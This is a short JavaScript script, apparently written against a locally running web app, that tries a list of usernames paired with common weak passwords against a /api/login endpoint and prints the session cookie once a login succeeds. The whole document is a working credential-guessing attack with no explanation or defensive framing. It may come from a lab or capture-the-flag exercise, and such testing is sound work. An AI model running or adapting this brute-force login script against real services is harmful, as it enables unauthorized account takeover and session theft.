const candidates=[['Alpha','password'],['Alpha','admin'],['Alpha','admin123'],['Alpha','Password123'],['Alpha','password123'],['Alpha','12345678'],['Alpha','secret'],['Alpha','Alpha123!'],['Delta','password'],['Delta','admin'],['Delta','admin123'],['user1','password'],['user1','admin'],['user1','user1'],['user1','password123']];
(async()=>{
  for(const [u,p] of candidates){
    const res=await fetch('http://localhost:3000/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
    const text=await res.text();
    console.log(u,p,res.status,text.slice(0,200));
    if(res.ok){
      console.log('SET_COOKIE', res.headers.get('set-cookie'));
      break;
    }
  }
})();
